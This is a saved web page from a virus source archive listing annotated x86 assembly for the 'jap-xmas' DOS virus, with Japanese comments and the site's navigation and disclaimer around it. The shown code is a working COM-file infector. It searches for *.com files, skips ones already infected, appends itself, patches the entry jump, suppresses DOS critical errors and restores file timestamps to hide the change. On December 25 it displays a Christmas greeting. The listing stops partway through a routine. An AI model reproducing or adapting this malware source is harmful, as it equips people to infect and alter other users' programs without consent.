<html>
<head><meta http-equiv=Content-Type content='text/html; charset=UTF-8'>

<title>Virus Source Code Database :: jap-xmas_asm</title>
<meta name="KEYWORDS" content="jap-xmas.asm, virus source, source code, assembly language, assembly programming, hacking, cracking, michaelangelo, stoned, pong, cascade, ambulance, f-prot, mcafee, panda, solomon, anti-virus, anti virus, computer virus">
<meta name="DESCRIPTION" content="Virus Source Code Database - source for jap-xmas.asm">
</head><body><table border=0 cellpadding=0 cellspacing=0 width="100%">
<tr><td valign=top width="25%">
<a href="j_1808_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/j_1808_asm.php">j_1808_asm</a><br>
<a href="j-1808_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/j-1808_asm.php">j-1808_asm</a><br>
<a href="j_a204_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/j_a204_asm.php">j_a204_asm</a><br>
<a href="j-a204_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/j-a204_asm.php">j-a204_asm</a><br>
<a href="jackal_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/jackal_asm.php">jackal_asm</a><br>
<a href="jap-xmas_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/jap-xmas_asm.php">jap-xmas_asm</a><br>
<a href="jasmine_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/jasmine_asm.php">jasmine_asm</a><br>
<a href="jaws26k_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/jaws26k_asm.php">jaws26k_asm</a><br>
<a href="jaws528_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/jaws528_asm.php">jaws528_asm</a><br>
<a href="je_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/je_asm.php">je_asm</a><br>
<a href="jeru_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/jeru_asm.php">jeru_asm</a><br>
<a href="jerubc_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/jerubc_asm.php">jerubc_asm</a><br>
<a href="jerube_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/jerube_asm.php">jerube_asm</a><br>
<a href="jeru_dc_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/jeru_dc_asm.php">jeru_dc_asm</a><br>
<a href="jerufcen_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/jerufcen_asm.php">jerufcen_asm</a><br>
<a href="jeru_fre_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/jeru_fre_asm.php">jeru_fre_asm</a><br>
<a href="jeru_o_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/jeru_o_asm.php">jeru_o_asm</a><br>
<a href="jerusale_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/jerusale_asm.php">jerusale_asm</a><br>
<a href="jerusalm_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/jerusalm_asm.php">jerusalm_asm</a><br>
<a href="jerus_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/jerus_asm.php">jerus_asm</a><br>
<a href="jeruslm_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/jeruslm_asm.php">jeruslm_asm</a><br>
<a href="jeruzal_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/jeruzal_asm.php">jeruzal_asm</a><br>
<a href="jeruz_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/jeruz_asm.php">jeruz_asm</a><br>
<a href="jesus__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/jesus__asm.php">jesus__asm</a><br>
<a href="jesus_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/jesus_asm.php">jesus_asm</a><br>
<a href="jfk3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/jfk3_asm.php">jfk3_asm</a><br>
<a href="jo1_11_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/jo1_11_asm.php">jo1_11_asm</a><br>
<a href="joana111_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/joana111_asm.php">joana111_asm</a><br>
<a href="john_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/john_asm.php">john_asm</a><br>
<a href="johngalt_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/johngalt_asm.php">johngalt_asm</a><br>
<a href="joker_3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/joker_3_asm.php">joker_3_asm</a><br>
<a href="joker_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/joker_asm.php">joker_asm</a><br>
<a href="jokr1602_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/jokr1602_asm.php">jokr1602_asm</a><br>
<a href="joshext_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/joshext_asm.php">joshext_asm</a><br>
<a href="joshi__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/joshi__asm.php">joshi__asm</a><br>
<a href="joshi_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/joshi_asm.php">joshi_asm</a><br>
<a href="joshua_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/joshua_asm.php">joshua_asm</a><br>
<a href="jo_v111_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/jo_v111_asm.php">jo_v111_asm</a><br>
<a href="j_sundyb_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/j_sundyb_asm.php">j_sundyb_asm</a><br>
<a href="j-sundyb_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/j-sundyb_asm.php">j-sundyb_asm</a><br>
<a href="jump4joy_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/jump4joy_asm.php">jump4joy_asm</a><br>
<a href="justice_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/justice_asm.php">justice_asm</a><br>
<a href="jw2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/jw2_asm.php">jw2_asm</a><br>
</td>
<td valign=top><center><h2>Virus Source Code Database</h2>
<script type="text/javascript">
<!--
                  google_ad_client = "pub-4280558320877613";
                  google_ad_width = 468;
                  google_ad_height = 60;
                  google_ad_format = "468x60_as";
                  google_ad_channel = "5524853059";
                  google_ad_type = "text";
                  google_color_border = "A2CCEE";
                  google_color_bg = "EFEFEF";
                  google_color_link = "000000";
                  google_color_url = "006600";
                  google_color_text = "000000";
        //--></script>
<script type="text/javascript" src="show_ads.js" tppabs="http://pagead2.googlesyndication.com/pagead/show_ads.js"></script>
<p>
<i>This source code is provided for computer programming history.  This source code can be used for good or evil.  It can 
destroy computer data.  Be aware that I am making no claims to authorship or usability of the information found in the 
Virus Source Code Database.  I accept no responsibility for data corruption due to the use of the following information.  The 
information contained on this website is for <b>Information Purposes Only</b>!!!</i><p>
<p>
[ <a href="index.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/index.php">1</a> ]&nbsp;
[ <a href="index-1.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/index.php">a</a> ]&nbsp;
[ <a href="index-2.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/index.php">b</a> ]&nbsp;
[ <a href="index-3.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/index.php">c</a> ]&nbsp;
[ <a href="index-4.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/index.php">d</a> ]&nbsp;
[ <a href="index-5.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/index.php">e</a> ]&nbsp;
[ <a href="index-6.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/index.php">f</a> ]&nbsp;
[ <a href="index-7.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/index.php">g</a> ]&nbsp;
[ <a href="index-8.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/index.php">h</a> ]&nbsp;
[ <a href="index-9.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/index.php">i</a> ]&nbsp;
[ <a href="index-10.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/index.php">j</a> ]&nbsp;
[ <a href="index-11.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/index.php">k</a> ]&nbsp;
[ <a href="index-12.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/index.php">l</a> ]&nbsp;
[ <a href="index-13.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/index.php">m</a> ]&nbsp;
[ <a href="index-14.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/index.php">n</a> ]&nbsp;
[ <a href="index-15.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/index.php">o</a> ]&nbsp;
[ <a href="index-16.php.htm" tppabs="http://www.totallygeek.com/vscdb/p/index.php">p</a> ]&nbsp;
[ <a href="index-17.php.htm" tppabs="http://www.totallygeek.com/vscdb/q/index.php">q</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/r/index.php  \n\nThis file was not retrieved by Teleport Pro, because it was unavailable, or its retrieval was aborted, or the project was stopped too soon.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/r/index.php'" tppabs="http://www.totallygeek.com/vscdb/r/index.php">r</a> ]&nbsp;
[ <a href="index-19.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/index.php">s</a> ]&nbsp;
[ <a href="index-20.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/index.php">t</a> ]&nbsp;
[ <a href="index-21.php.htm" tppabs="http://www.totallygeek.com/vscdb/u/index.php">u</a> ]&nbsp;
[ <a href="index-22.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/index.php">v</a> ]&nbsp;
[ <a href="index-23.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/index.php">w</a> ]&nbsp;
[ <a href="index-24.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/index.php">x</a> ]&nbsp;
[ <a href="index-25.php.htm" tppabs="http://www.totallygeek.com/vscdb/y/index.php">y</a> ]&nbsp;
[ <a href="index-26.php.htm" tppabs="http://www.totallygeek.com/vscdb/z/index.php">z</a> ]&nbsp;
</center><p><textarea cols=90 rows=30>

;-------------------------------------------------------
;	ＤＡｐｍ−２
;-------------------------------------------------------
;
;	オリジナルプログラム先頭
;P_TOP:	JMP	P_00000					;E9 XX XX	...
;	（オリジナルプログラム部分省略）


;	ウイルスエントリー位置	(P_00000:Virus_Top)
;
;------------------------------------------------------------------------------
;	ウイルス先頭アドレス取得・感染ファイル先頭の４バイト復旧
;------------------------------------------------------------------------------
P_00000:MOV    BL,001H 	;感染識別データ(01H)            ;B3 01 	..
	CALL   NEAR PTR P_00005                         ;E8 00 00 	...
P_00005:POP    DI                                       ;5F 	_
	SUB    DI,00005H ;DI=ｳｲﾙｽﾄｯﾌﾟ(P_00000)ｵﾌｾｯﾄｱﾄﾞﾚｽ;83 EF 05 	...
	MOV    BP,DI                                    ;8B EF 	..
	ADD    BP,00358H ;BP=ﾜｰｸｴﾘｱのトップアドレス     ;81 C5 58 03 	..X.
	MOV    [BP+00406H],DI	;ｳｲﾙｽﾄｯﾌﾟｵﾌｾｯﾄｱﾄﾞﾚｽ保存	;89 BE 06 04 	....
	JNE    P_00019          ;P_00019へ（JNEはｳｲﾙｽ作成中の痕跡）;75 04 u.
;---------------------------------
D_00015:MOV    AX,CS  	;オリジナルデータ ｵﾌｾｯﾄ(P_TOP:)	;8C C8 	..
D_00017:MOV    DS,AX    ;                 ｵﾌｾｯﾄ(P_TOP:)+2;8E D8 	..
;---------------------------------
P_00019:PUSH   DI               			;57 	W
	MOV    DI,00100H       				;BF 00 01 	...
	MOV    SI,[BP+00406H]   ;=ｳｲﾙｽﾄｯﾌﾟｱﾄﾞﾚｽ         ;8B B6 06 04 	....
	ADD    SI,00015H        ;D_00015/D_00017        ;83 C6 15 	...
	MOV    CX,00002H        ;感染時に変更したCOMﾌｧｲﾙ;B9 02 00 	...
	CLD                     ;の先頭４バイトを修復   ;FC 	.
	REPZ                                            ;F3 	.
	MOVSW                                           ;A5 	.
	POP    DI                                       ;5F 	_
;------------------------------------------------------------------------------
;	発病の判断・感染処理への分岐
;------------------------------------------------------------------------------
	MOV    AH,02CH       	;時刻の取得             ;B4 2C 	.,
	INT    21H                                      ;CD 21 	.!
	ADD    DX,BP                                    ;03 D5 	..
	MOV    [BP+00400H],DH   ;DH=（秒）乱数に使用    ;88 B6 00 04 	....
	MOV    AL,000H          ;感染世代ｶｳﾝﾀ(減算)	;B0 00 	..
;
;<説明>	この｢MOV AL,000H｣命令の｢000H｣のデータは「発病を禁止・許可」する
;	１バイトのフラグ（感染世代を示すカウンタ）で、｢000H｣に達するまで
;	の間は、自分のカウンタをデクリメント｢-1｣したウイルスを感染する。
;	以下のプロセスは、ウイルス作者が設定した値より｢00H｣に達するまでの間、
;	（｢0XXH｣〜｢001H｣まで）感染ファイルは「１２月２５日でも発病を禁止」
;	し、感染処理を専門に行う様設計されている。
;
	AND    AL,AL            ;感染世代ｶｳﾝﾀ(減算)が0以外_	;22 C0 	".
	JNE    P_0004E          ;は発病禁止(感染処理へ)		;75 13 	u.
	MOV    AH,02AH          ;日付の取得             ;B4 2A 	.*
	INT    21H                                      ;CD 21 	.!
	CMP    DH,00CH          ;今日は１２月か？       ;80 FE 0C 	...
	JNE    P_0004E          ;No.感染処理へ		;75 0A 	u.
	ADD    DH,DH            ;DH=00CH*2=018H         ;02 F6 	..
	INC    DH               ;DH=019H=25             ;FE C6 	..
	CMP    DL,DH            ;今日は(12月)２５日か？ ;3A D6 	:.
	JNE    P_0004E          ;No.感染処理へ          ;75 02 	u.
	JMP    SHORT P_00051    ;Yes.発病処理へ         ;EB 03 	..
P_0004E:JMP    NEAR PTR P_000D5 ;＜感染処理へ＞         ;E9 84 00 	...
;------------------------------------------------------------------------------
;	P_00051	発病処理　感染世代ｶｳﾝﾀが｢000H｣かつ１２月２５日に発病
;------------------------------------------------------------------------------
;
;<解説>	画面上に'A merry christmas to you!'を（色を変えながら）表示する。
;	（）については、NEC-PC系エスケープシーケンスを使用している。
;
P_00051:MOV    SI,000CBH       	;発病文字列D_000CBHﾃﾞｰﾀ位置;BE CB 00 	...
	ADD    SI,DI            ;実際のｱﾄﾞﾚｽに換算  	;03 F7 	..
	CALL   NEAR PTR P_00242 ;暗号解除・文字列の表示	;E8 E9 01 	...
P_00059:MOV    SI,000AAH        ;表示色D_000AAﾃﾞｰﾀ位置  ;BE AA 00 	...
	ADD    SI,DI            ;実際のｱﾄﾞﾚｽに換算	;03 F7 	..
	MOV    AL,[SI]          			;8A 04 	..
	XOR    AL,0FEH          ;色ﾃﾞｰﾀの暗号解除       ;34 FE 	4.
	INC    AL               ;色ﾃﾞｰﾀの変更(+1)       ;FE C0 	..
	XOR    AL,0FEH          ;変更した色ﾃﾞｰﾀに暗号を掛けて、;34 FE 	4.
	MOV    [SI],AL          ;表示用の暗号文字列にｾｯﾄ;88 04 	..
	XOR    AL,0FEH          ;再度　暗号解除         ;34 FE 	4.
	CMP    AL,037H          ;色ﾃﾞｰﾀは「白色」か？   ;3C 37 	<7
	JNLE   P_0008D          ;「白色」ならば表示終了 ;7F 1F 	..
	MOV    SI,00098H        ;'A mer..'発病文字列ﾃﾞｰﾀ位置;BE 98 00 	...
	ADD    SI,DI            ;実際のｱﾄﾞﾚｽに換算      ;03 F7 	..
	CALL   NEAR PTR P_00242 ;暗号解除・文字列の表示 ;E8 CC 01 	...
	MOV    AL,019H          ;表示時のウエイトルーチン;B0 19 	..
P_00078:MOV    CX,0EA60H                                ;B9 60 EA 	.`.
P_0007B:NOP                                             ;90 	.
	NOP                                             ;90 	.
	NOP                                             ;90 	.
	NOP                                             ;90 	.
	NOP                                             ;90 	.
	NOP                                             ;90 	.
	NOP                                             ;90 	.
	NOP                                             ;90 	.
	NOP                                             ;90 	.
	NOP                                             ;90 	.
	LOOP   P_0007B         	;（時間稼ぎ）           ;E2 F4 	..
	DEC    AL                                       ;FE C8 	..
	JNE    P_00078                                  ;75 ED 	u.
	JMP    SHORT P_00059   ;別の色で文字列を表示する;EB CC 	..
P_0008D:MOV    SI,000CBH   	;ｴｽｹｰﾌﾟｼｰｹﾝｽ初期値ﾃﾞｰﾀ位置;BE CB 00 	...
	ADD    SI,DI            ;実際のｱﾄﾞﾚｽ位置に換算  ;03 F7 	..
	CALL   NEAR PTR P_00242 ;（画面の消去など）     ;E8 AD 01 	...
	JMP    NEAR PTR P_0023C ;ｳｲﾙｽ終了処理(ｱﾌﾟﾘｹｰｼｮﾝ復帰);E9 A4 01 	...
;------------------------------------------------------------------------------
D_00098:DB	0E5H	;<暗号化>発病表示文字列              ;E5 	.
	DB	0A5H    ;暗号解除後                          ;A5 	.
	DB	0C0H    ;01BH,'[>5h',01BH,'[12;27H',01BH,'[5;3';C0 	.
	DB	0CBH                                         ;CB 	.
	DB	096H                                         ;96 	.
	DB	0E5H                                         ;E5 	.
	DB	0A5H                                         ;A5 	.
	DB	0CFH                                         ;CF 	.
	DB	0CCH                                         ;CC 	.
	DB	0C5H                                         ;C5 	.
	DB	0CCH                                         ;CC 	.
	DB	0C9H                                         ;C9 	.
	DB	0B6H                                         ;B6 	.
	DB	0E5H                                         ;E5 	.
	DB	0A5H                                         ;A5 	.
	DB	0CBH                                         ;CB 	.
	DB	0C5H                                         ;C5 	.
D_000AA:DB	0CDH   	;(ﾃﾞｰﾀはD_00098より継続)	     ;CD 	.
	DB	0CFH    ;暗号解除後                          ;CF 	.
	DB	093H    ;'1','m',                            ;93 	.
	DB	0BFH    ;'A merry christmas to you!','[m',00H;BF 	.
	DB	0DEH                                         ;DE 	.
	DB	093H                                         ;93 	.
	DB	09BH                                         ;9B 	.
	DB	08CH                                         ;8C 	.
	DB	08CH                                         ;8C 	.
	DB	087H                                         ;87 	.
	DB	0DEH                                         ;DE 	.
	DB	09DH                                         ;9D 	.
	DB	096H                                         ;96 	.
	DB	08CH                                         ;8C 	.
	DB	097H                                         ;97 	.
	DB	08DH                                         ;8D 	.
	DB	08AH                                         ;8A 	.
	DB	093H                                         ;93 	.
	DB	09FH                                         ;9F 	.
	DB	08DH                                         ;8D 	.
	DB	0DEH                                         ;DE 	.
	DB	08AH                                         ;8A 	.
	DB	091H                                         ;91 	.
	DB	0DEH                                         ;DE 	.
	DB	087H                                         ;87 	.
	DB	091H                                         ;91 	.
	DB	08BH                                         ;8B 	.
	DB	0DFH                                         ;DF 	.
	DB	0F3H                                         ;F3 	.
	DB	0F4H                                         ;F4 	.
	DB	0E5H                                         ;E5 	.
	DB	0A5H                                         ;A5 	.
	DB	093H                                         ;93 	.
	DB	0FEH                                         ;FE 	.
;---------------------------------
D_000CC:DB	0E5H ;<暗号化>発病用表示文字列		     ;E5 	.
	DB	0A5H ;暗号解除後                             ;A5 	.
	DB	0C0H ;01BH,'[>5l',01BH,'[2J',000H            ;C0 	.
	DB	0CBH                                         ;CB 	.
	DB	092H                                         ;92 	.
	DB	0E5H                                         ;E5 	.
	DB	0A5H                                         ;A5 	.
	DB	0CCH                                         ;CC 	.
	DB	0B4H                                         ;B4 	.
	DB	0FEH                                         ;FE 	.
;------------------------------------------------------------------------------
;	P_000D5	感染処理　エントリー位置　（感染世代カウンタのデクリメント）
;------------------------------------------------------------------------------
P_000D5:MOV    BX,00035H        ;感染世代ｶｳﾝﾀチェック   ;BB 35 00 	.5.
	ADD    BX,DI                                    ;03 DF 	..
	MOV    AX,[BX]                                  ;8B 07 	..
	AND    AH,AH            ;カウンタ＝０？         ;22 E4 	".
	JE     P_000E2          ;すでに０であればそのまま;74 02 	t.
	DEC    AH               ;カウンタを「-1」する   ;FE CC 	..
;------------------------------------------------------------------------------
;	P_000E2	カレントディレクトリのＣＯＭファイルを検索
;------------------------------------------------------------------------------
P_000E2:MOV    [BX],AX                                  ;89 07 	..
	MOV    AH,01AH                                  ;B4 1A 	..
	MOV    DX,BP                                    ;8B D5 	..
	INT    21H              ;ＤＴＡ領域確保         ;CD 21 	.!
	MOV    AH,04EH                                  ;B4 4E 	.N
	MOV    CX,00020H                                ;B9 20 00 	. .
	MOV    DX,00110H        ;検索ﾌｧｲﾙﾊﾟｽ'*.com',00H ;BA 10 01 	...
	ADD    DX,DI            ;実際のｱﾄﾞﾚｽに換算	;03 D7 	..
	INT    21H              ;最初に一致するﾌｧｲﾙ検索 ;CD 21 	.!
	MOV    CL,[BP+00400H]   ;乱数取得　０〜５９     ;8A 8E 00 04 	....
	AND    CL,007H          ;乱数CL＝　０〜７       ;80 E1 07 	...
	INC    CL               ;乱数CL＝　１〜８       ;FE C1 	..
P_000FF:CMP    AL,012H                                  ;3C 12 	<.
	JNE    P_00106          ;（該当ﾌｧｲﾙあり）	;75 03 	u.
	JMP    NEAR PTR P_0023C ;（該当ﾌｧｲﾙなし･終了）  ;E9 36 01 	.6.
P_00106:DEC    CL               ;乱数をﾃﾞｶｳﾝﾄ(-1)       ;FE C9 	..
	JE     P_00116          ;乱数が０になる時の該当ﾌｧｲﾙに感染;74 0C	t.
	MOV    AH,04FH          ;次に一致するﾌｧｲﾙ検索   ;B4 4F 	.O
	INT    21H                                      ;CD 21 	.!
	JMP    SHORT P_000FF                            ;EB EF 	..
;---------------------------------
D_00110:DB	02AH  	;最初に一致するﾌｧｲﾙ検索用　ﾊﾟｽ文字列 ;2A 	*
	DB	02EH    ;'*.com',00H                         ;2E 	.
	DB	063H                                         ;63 	c
	DB	06FH                                         ;6F 	o
	DB	06DH                                         ;6D 	m
	DB	000H                                         ;00 	.
;------------------------------------------------------------------------------
;	P_00116	ＤＴＡアドレス変更・COMファイル読込
;------------------------------------------------------------------------------
P_00116:MOV    SI,BP    	;ＤＴＡ                 ;8B F5 	..
	ADD    SI,0001EH	;検索されたﾌｧｲﾙ名のｱﾄﾞﾚｽ;83 C6 1E 	...
	MOV    AX,03D00H                                ;B8 00 3D 	..=
	MOV    DX,BP                                    ;8B D5 	..
	ADD    DX,0001EH        ;(R:ﾘｰﾄﾞﾓｰﾄﾞ)           ;83 C2 1E 	...
	INT    21H              ;ＤＴＡによるﾌｧｲﾙｵｰﾌﾟﾝ  ;CD 21 	.!
	JNB    P_0012A          ;(ｵｰﾌﾟﾝ成功)            ;73 03 	s.
	JMP    NEAR PTR P_0023C ;失敗                   ;E9 12 01 	...
P_0012A:MOV    BX,AX            ;ハンドル番号           ;8B D8 	..
	MOV    AX,05700H                                ;B8 00 57 	..W
	INT    21H              ;ﾌｧｲﾙﾀｲﾑｽﾀﾝﾌﾟ取得       ;CD 21 	.!
	MOV    [BP+00408H],CX   ;時刻:ﾀｲﾑｽﾀﾝﾌﾟ保存      ;89 8E 08 04 	....
	MOV    [BP+0040AH],DX   ;日付                   ;89 96 0A 04 	....
	MOV    AH,03FH                                  ;B4 3F 	.?
	MOV    CX,07800H                                ;B9 00 78 	..x
	MOV    DX,BP            ;(DS:DX=ﾘｰﾄﾞﾊﾞｯﾌｧ)      ;8B D5 	..
	ADD    DX,00500H        ;先頭から07800Hﾊﾞｲﾄ     ;81 C2 00 05 	....
	INT    21H              ;ファイルリード		;CD 21 	.!
	MOV    [BP+00404H],AX   ;AX=実際の読込サイズ	;89 86 04 04 	....
	MOV    AH,03EH                                  ;B4 3E 	.>
	INT    21H              ;ﾌｧｲﾙｸﾛｰｽﾞ	        ;CD 21 	.!
;------------------------------------------------------------------------------
;	重複感染を防止するチェック（ｳｲﾙｽｵﾌｾｯﾄ01Hの1ﾊﾞｲﾄ｢01H｣による）
;------------------------------------------------------------------------------
;
;<解説>	読込COMファイルの先頭が	
;	｢E9H｣ＪＭＰ命令でない場合＝未感染と判断（感染する）
;	｢E9H｣であって、	飛先+01Hのコードが｢01H｣＝感染済（感染を中止）
;			飛先+01Hのコードが｢01H｣ではない＝未感染と判断
;							（感染する）
;
	MOV    SI,BP                                    ;8B F5 	..
	ADD    SI,00500H      	;（ﾘｰﾄﾞﾊﾞｯﾌｧ先頭）      ;81 C6 00 05 	....
	CMP    Byte Ptr [SI],0E9H;先頭命令はJMP(0E9H)か？;80 3C E9 	.<.
	JNE    P_0016B        	;No.未感染と判断・感染へ ;75 12 	u.
	INC    SI               ;Yes.                   ;46 	F
	MOV    AX,[SI]                                  ;8B 04 	..
	ADD    SI,00002H                                ;83 C6 02 	...
	ADD    SI,AX         	;ジャンプ先位置を求める ;03 F0 	..
	MOV    AX,[SI]                                  ;8B 04 	..
	CMP    AH,001H          ;感染識別コード確認	;80 FC 01 	...
	JNE    P_0016B          ;No.未感染と判断・感染へ;75 03 	u.
	JMP    NEAR PTR P_0023C ;Yes.感染済と判断･終了へ;E9 D1 00 	...
;------------------------------------------------------------------------------
;	P_0016B	メモリー(ﾊﾞｯﾌｧ)上でウイルス取付･先頭４バイト書換
;------------------------------------------------------------------------------
P_0016B:MOV    DI,BP                                    ;8B FD 	..
	ADD    DI,00500H                                ;81 C7 00 05 	....
	ADD    DI,[BP+00404H]  	;読込ﾌｧｲﾙの終端位置     ;03 BE 04 04 	....
	MOV    SI,[BP+00406H]   ;ｳｲﾙｽ自身の先頭位置(P_00000);8B B6 06 04 ....
	MOV    CX,00258H                                ;B9 58 02 	.X.
	NOP                                             ;90 	.
	REPZ                                            ;F3 	.
	MOVSB                 	;ｳｲﾙｽｺｰﾄﾞをﾊﾞｯﾌｧ上で取り付ける;A4 	.
	MOV    SI,BP                                    ;8B F5 	..
	ADD    SI,00500H                                ;81 C6 00 05 	....
	MOV    DI,SI                                    ;8B FE 	..
	ADD    DI,[BP+00404H]                           ;03 BE 04 04 	....
	ADD    DI,00015H                                ;83 C7 15 	...
	MOV    CX,00002H                                ;B9 02 00 	...
	REPZ                                            ;F3 	.
	MOVSW                  	;ﾊﾞｯﾌｧ内の先頭4ﾊﾞｲﾄを保存;A5 	.
	MOV    DI,BP                                    ;8B FD 	..
	ADD    DI,00500H                                ;81 C7 00 05 	....
	MOV    Byte Ptr [DI],0E9H;先頭をJMP命令に書換   ;C6 05 E9 	...
	INC    DI                                       ;47 	G
	MOV    AX,[BP+00404H]                           ;8B 86 04 04 	....
	SUB    AX,00003H                                ;2D 03 00 	-..
	MOV    [DI],AX          ;ｼﾞｬﾝﾌﾟｱﾄﾞﾚｽをJMPｺｰﾄﾞで書込む;89 05 	..
	MOV    DI,BP                                    ;8B FD 	..
	ADD    DI,00758H        ;(D_00256)ｱﾄﾞﾚｽに相当	;81 C7 58 07 	..X.
	ADD    DI,[BP+00404H]                           ;03 BE 04 04 	....
	MOV    AX,[BP+00404H]                           ;8B 86 04 04 	....
	ADD    AX,00258H                                ;05 58 02 	.X.
	NOP                                             ;90 	.
	NEG    AX                                       ;F7 D8 	..
	SUB    DI,00002H                                ;83 EF 02 	...
	MOV    [DI],AX        	;ｳｲﾙｽからｵﾘｼﾞﾅﾙ先頭に戻る位置ｾｯﾄ;89 05 	..
;------------------------------------------------------------------------------
;	ＩＮＴ２４Ｈ致命的エラー割り込みの無効化
;------------------------------------------------------------------------------
	CLI                                             ;FA 	.
	MOV    DI,[BP+00406H]                           ;8B BE 06 04 	....
	XOR    AX,AX         	;ＩＮＴ２４Ｈベクタ取得 ;33 C0 	3.
	MOV    ES,AX                                    ;8E C0 	..
	MOV    BX,00090H                                ;BB 90 00 	...
	MOV    AX,ES:[BX]     	;ＩＮＴ２４Ｈベクタ保存 ;26 8B 07 	&..
	MOV    [DI+00251H],AX                           ;89 85 51 02 	..Q.
	MOV    AX,ES:[BX+2]                             ;26 8B 47 02 	&.G.
	MOV    [DI+00253H],AX                           ;89 85 53 02 	..S.
	MOV    AX,0023FH  	;ＩＮＴ２４Ｈベクタ書換 ;B8 3F 02 	.?.
	ADD    AX,DI            ;(致命的エラーの無効化) ;03 C7 	..
	MOV    ES:[BX],AX                               ;26 89 07 	&..
	MOV    AX,CS                                    ;8C C8 	..
	MOV    ES:[BX+2],AX                             ;26 89 47 02 	&.G.
	STI                                             ;FB 	.
;------------------------------------------------------------------------------
;	バッファー上の「ウイルス付きプログラム」を書き込み
;------------------------------------------------------------------------------
	MOV    AX,03C01H                                ;B8 01 3C 	..<
	MOV    DX,BP                                    ;8B D5 	..
	ADD    DX,0001EH        ;(DS:DX=ﾊﾞｯﾌｧ)(W:ﾗｲﾄﾓｰﾄﾞ);83 C2 1E 	...
	INT    21H          	;ＤＴＡによるﾌｧｲﾙｵｰﾌﾟﾝ  ;CD 21 	.!
	MOV    BX,AX            ;ハンドル番号           ;8B D8 	..
	JB     P_00218          ;(失敗)                 ;72 21 	r!
	PUSH   BX                                       ;53 	S
	MOV    AH,040H                                  ;B4 40 	.@
	MOV    CX,[BP+00404H]                           ;8B 8E 04 04 	....
	ADD    CX,00258H                                ;81 C1 58 02 	..X.
	MOV    DX,BP                                    ;8B D5 	..
	ADD    DX,00500H        ;(感染したﾌｧｲﾙに書換)	;81 C2 00 05 	....
	INT    21H       	;ライトハンドル         ;CD 21 	.!
	POP    BX                                       ;5B 	[
	MOV    AX,05701H                                ;B8 01 57 	..W
	MOV    CX,[BP+00408H]   ;保存ﾀｲﾑｽﾀﾝﾌﾟ           ;8B 8E 08 04 	....
	MOV    DX,[BP+0040AH]                           ;8B 96 0A 04 	....
	INT    21H           	;ﾌｧｲﾙﾀｲﾑｽﾀﾝﾌﾟ設定（復元）;CD 21 	.!
P_00218:MOV    AH,03EH          			;B4 3E 	.>
	INT    21H            	;ファイルクローズ       ;CD 21 	.!
;------------------------------------------------------------------------------
;	ＩＮＴ２４Ｈ致命的エラー割り込みの復旧
;------------------------------------------------------------------------------
	CLI                                             ;FA 	.
	MOV    DI,[BP+00406H]                           ;8B BE 06 04 	....
	XOR    AX,AX            ;ＩＮＴ２４Ｈベクタ復旧 ;33 C0 	3.
	MOV    ES,AX                                    ;8E C0 	..
	MOV    BX,00090H                                ;BB 90 00 	...
